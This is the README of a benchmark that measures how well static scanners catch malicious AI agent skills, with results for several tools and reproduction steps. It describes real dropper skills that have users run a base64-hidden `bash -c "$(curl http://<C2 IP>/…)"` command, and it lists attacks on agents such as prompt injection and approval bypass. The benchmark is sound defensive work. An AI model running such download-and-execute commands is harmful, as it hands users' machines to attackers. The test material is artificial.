# Agent-skill scanner benchmark

How well static scanners separate malicious agent skills (`SKILL.md` plus its
scripts and reference files) from published, legitimate ones. Everything needed
to reproduce the numbers is here: the attack generators, the clean-skill sets
(as repositories pinned to commits, not copies), the runner and the scorer.

The results include where PromptSonar loses. On clean skills it has never
seen, Cisco's skill-scanner flags fewer of them than PromptSonar does.

The most important test is the last one below: **real malicious skills** taken
from the ClawHub registry (the 2026 ClawHavoc campaign), from the
[MalSkills](https://github.com/security-pride/MalSkills) benchmark.

## What is measured

- **Malicious skills caught**: the scanner's worst finding is HIGH or CRITICAL.
- **Clean skills flagged**: the same test on published skills. Every flag here
  is a false alarm a user would have to dismiss.

A scanner can trivially catch every attack by flagging everything, so the two
numbers only mean something together.

## The sets

| Set | Malicious | Clean | Status |
|---|---|---|---|
| Development | 20 (`make_dev_attacks.py`) + 6 hard-clean | 56 from anthropics/skills, vercel-labs/agent-skills and four other skill repositories (commits not recorded) | Rules were tuned on it |
| Held-out | 12 (`make_heldout_attacks.py`), written after the development work with new techniques | 227 ([`sources/heldout.json`](sources/heldout.json)) | Scored once with rules frozen; used for development afterwards |
| Fresh | none | 254 ([`sources/fresh.json`](sources/fresh.json)) | Scored once; used for development afterwards |
| Sealed | none | 343 ([`sources/sealed.json`](sources/sealed.json)), deduplicated against every earlier set | Scored once, after the work it measures; used for development afterwards |

The malicious skills were written by the PromptSonar maintainers to cover the
attack classes reported for agent skills (credential exfiltration, download and
execute, prompt injection in reference files, approval bypass, concealment,
obfuscation). They are not collected from real incidents, which is this
benchmark's main limitation. A set of real-world malicious skills is the most
useful contribution anyone could make here.

## Results (Nov 2026)

Tools: PromptSonar 1.6.0-dev (`scan` per file, `repo` for the repository
report), Cisco skill-scanner 2.3.2 (static mode), NVIDIA SkillSpector 2.12.0
(`--no-llm`), SkillGuard 0.3.2, claude-skill-antivirus 2.2.1 (`--scan-only`),
SkillScan 0.4.0. Tools that need an API key or send content to a service were
not run.

### Held-out set, rules frozen (the honest recall number)

| Tool | Malicious caught (of 12) | Clean flagged (of 227) |
|---|---|---|
| NVIDIA SkillSpector | **6** | 110 (48%) |
| Cisco skill-scanner | 5 | **16 (7%)** |
| PromptSonar (frozen, `scan` / `repo`) | 4 | 57 / 40 |
| claude-skill-antivirus | 3 | 91 |
| SkillGuard | 1 | 12 |
| SkillScan | 1 | 31 |

No tool caught more than half of the unseen attacks. The gaps this exposed in
PromptSonar were then closed (see the CHANGELOG), so PromptSonar now catches
12/12 of them, but that is no longer a held-out number.

### Sealed set, scored once after the precision work (the honest false-alarm number)

| Tool | Clean flagged (of 343) |
|---|---|
| Cisco skill-scanner | **17 (5.0%)** |
| PromptSonar `repo`, after (commit 2d5b204) | 32 (9.3%) |
| PromptSonar `scan`, after | 45 (13.1%) |
| PromptSonar `repo`, before (commit 4345e13) | 48 (14.0%) |
| PromptSonar `scan`, before | 100 (29.2%) |

### Development numbers (tuned, for tracking only)

| | PromptSonar now (`scan` / `repo`) | Cisco |
|---|---|---|
| Dev malicious caught (of 20) | 20 / 20 | 12 |
| Dev clean flagged (of 56) | 2 / 2 | 7 |
| Held-out clean flagged (of 227) | 17 / 13 | 16 |
| Fresh clean flagged (of 254) | 22 / 20 | 23 |
| Sealed clean flagged (of 343), second round | 37 / 24 | 17 |

Speed: PromptSonar takes about 0.5 s per skill; Cisco about 7 s, SkillSpector
about 10 s.

### Real-world malicious skills (MalSkills, ClawHub 2026)

100 malicious ClawHub skills collected by Koi Security and 100 benign ClawHub
skills, from MalSkills at commit `46d60f0`. The malicious ones are droppers:
they tell the user to download a "prerequisite" archive with an extraction
password, to run a command from a paste site in Terminal, or to paste a
base64 blob that decodes to `bash -c "$(curl http://<C2 IP>/…)"`.

The rules were first scored as they were (frozen). The set was then split by
publisher (`fetch_malskills.py`). Rules were developed on the development half
only, and the test half was scored once:

| Test half (63 malicious, 49 benign), scored once | Malicious caught | Benign flagged |
|---|---|---|
| PromptSonar `scan`, before (frozen) | 13 | 3 |
| PromptSonar `repo`, before (frozen) | 12 | 1 |
| **PromptSonar `scan`, after** | **58** | 3 |
| **PromptSonar `repo`, after** | **58** | **1** |
| Cisco skill-scanner 2.3.2 | 55 | 7 |
| NVIDIA SkillSpector 2.12.0 (`--no-llm`) | **60** | 18 |

Before this work PromptSonar caught only 22 of the 100 real samples. What
changed: password-protected downloads, commands taken from paste sites,
base64-hidden commands (including macOS `base64 -D`), and `sh -c "$(curl …)"`
are all reported as download-and-execute. After that one scoring, one more gap
seen in the test half was fixed (`sh -c "$(curl …)"`), so the whole set is now
development data: 95/100 caught, 6 (`scan`) and 2 (`repo`) of 100 benign
flagged.

Still missed: a crypto-trading skill that bills a third-party service and asks
for a wallet `PRIVATE_KEY`, a skill pointing to a look-alike domain
(`openclawcli.forum`), and skills whose instructions show nothing harmful in the
text. Static analysis cannot see those without guessing.

## Reproduce

```bash
# PromptSonar from this checkout
npm ci && npm run build

# Other scanners (each is optional; install the ones you want to compare)
uv tool install cisco-ai-skill-scanner   # skill-scanner
uv tool install "skillspector @ git+https://github.com/NVIDIA/skillspector.git@17c4d386c6ad1a909601c2f3cd788bd3e6055001"  # NVIDIA SkillSpector 2.12.0
uv tool install skillscan
npm i claude-skill-antivirus && export SKILL_ANTIVIRUS=$PWD/node_modules/.bin/skill-install

cd benchmarks/skills/scripts
python3 -I make_dev_attacks.py     /tmp/bench/dev      # 20 malicious + 6 hard-clean
python3 -I make_heldout_attacks.py /tmp/bench/heldout  # 12 malicious
python3 -I fetch_clean.py ../sources/heldout.json /tmp/bench/heldout   # adds 227 clean skills
python3 -I fetch_clean.py ../sources/sealed.json  /tmp/bench/sealed
python3 -I fetch_malskills.py /tmp/bench/malskills     # real ClawHub malware: read-only, never run

for tool in promptsonar-scan promptsonar-repo cisco; do
  python3 -I run_tool.py $tool /tmp/bench/heldout /tmp/bench/heldout-out
done
python3 -I score.py /tmp/bench/heldout-out
```

Raw output of every tool is kept per skill under `<out>/<tool>/`, so any
reduction to a single severity can be audited. Set `PROMPTSONAR_CLI` to test
another build, and `--label NAME` to store its results under a different name.

## Rules for using this benchmark honestly

- A set stops being held-out the moment its results are used to change rules.
  Say so when quoting numbers from it.
- Report malicious caught and clean flagged together.
- Add new clean sets as new manifests, deduplicated against the old ones
  (`SKILL.md` hash), and score them once before looking inside.
